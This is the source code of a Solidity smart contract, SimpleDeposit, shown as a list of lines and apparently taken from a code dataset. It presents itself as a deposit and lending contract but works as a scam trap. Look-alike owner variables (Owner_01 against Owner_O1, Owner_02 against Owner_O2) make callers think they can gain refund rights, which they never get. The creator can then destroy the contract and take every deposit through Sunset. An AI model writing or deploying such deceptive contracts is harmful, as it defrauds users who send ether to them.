['pragma solidity ^0.4.16;\n', '\n', 'contract Base \n', '{\n', '    address Creator = msg.sender;\n', '    address Owner_01 = msg.sender;\n', '\n', '    \n', '    event Deposited(address indexed sender, uint value);\n', '    \n', '    event Invested(address indexed sender, uint value);\n', '    \n', '    event Refunded(address indexed sender, uint value);\n', '    \n', '    event Withdrew(address indexed sender, uint value);\n', '    \n', '    event Log(string message);\n', '    \n', '    address Owner_02;\n', '    address Owner_03;\n', '    \n', '    function add(uint256 x, uint256 y) \n', '    internal \n', '    returns (uint256) \n', '    {\n', '        uint256 z = x + y;\n', '        if((z >= x) && (z >= y))\n', '        {\n', '          return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '\n', '    function sub(uint256 x, uint256 y) \n', '    internal \n', '    returns (uint256) \n', '    {\n', '        if(x >= y)\n', '        {\n', '           uint256 z = x - y;\n', '           return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '\n', '    function mul(uint256 x, uint256 y) \n', '    internal \n', '    returns (uint256) \n', '    {\n', '        uint256 z = x * y;\n', '        if((x == 0) || (z / x == y))\n', '        {\n', '            return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '    \n', '}\n', '\n', 'contract SimpleDeposit is Base\n', '{\n', '    struct Creditor\n', '    {\n', '        uint Time;\n', '        uint Invested;\n', '    }\n', '    \n', '    uint public TotalDeposited;\n', '    uint public Available;\n', '    uint public DepositorsQty;\n', '    uint public prcntRate = 10;\n', '    bool RefundEnabled;\n', '    \n', '    address Owner_O1;\n', '    \n', '    mapping (address => uint) public Depositors;\n', '    mapping (address => Creditor) public Creditors;\n', '    \n', '    \n', '    address Owner_O2;\n', '    address Owner_O3;\n', '    \n', '\n', '    function initDeposit()\n', '    {\n', '        Owner_O1 = msg.sender;\n', '    }\n', '    \n', '    function SetTrustee(address addr) \n', '    public \n', '    {\n', '        require((msg.sender == Owner_O2)||(msg.sender==Creator));\n', '        Owner_O2 = addr;\n', '    }\n', '    \n', '    function SetFund(address addr) \n', '    public \n', '    {\n', '        require((msg.sender == Owner_O2)||(msg.sender==Creator));\n', '        Owner_O3 = addr;\n', '    }\n', '    \n', '    function SetPrcntRate(uint val)\n', '    public\n', '    {\n', '        if(val>=1&&msg.sender==Creator)\n', '        {\n', '            prcntRate = val;  \n', '        }\n', '    }\n', '    \n', '    function() payable\n', '    {\n', '        Deposit();\n', '    }\n', '    \n', '    function Deposit() \n', '    public\n', '    payable\n', '    {\n', '        if(msg.value>= 0.5 ether)\n', '        {\n', '            if(Depositors[msg.sender]==0)DepositorsQty++;\n', '            Depositors[msg.sender]+=msg.value;\n', '            TotalDeposited+=msg.value;\n', '            Available+=msg.value;\n', '            Invested(msg.sender,msg.value);\n', '        }   \n', '    }\n', '    \n', '    function ToLend() \n', '    public \n', '    payable\n', '    {\n', '        Creditors[msg.sender].Time = now;\n', '        Creditors[msg.sender].Invested += msg.value;\n', '        Deposited(msg.sender,msg.value);\n', '    }\n', '    \n', '    function RefundDeposit(address _addr, uint _wei) \n', '    public \n', '    payable\n', '    {\n', '        if(Depositors[_addr]>0)\n', '        {\n', '            if(isAllowed())\n', '            {\n', '                _addr.send(_wei);\n', '                Available-=_wei;\n', '                Withdrew(_addr,_wei);\n', '                 \n', '            }\n', '        }\n', '    }\n', '    \n', '     function isAllowed()\n', '    private\n', '    constant \n', '    returns (bool)\n', '    {\n', '        return( msg.sender == Owner_01 || msg.sender == Owner_02 || msg.sender == Owner_03);\n', '    }\n', '    \n', '    function Sunset()\n', '    public\n', '    payable\n', '    {\n', '        if(msg.sender==Creator)\n', '        {\n', '            suicide(Creator);\n', '        }\n', '    }\n', '    \n', '    \n', '  \n', '}']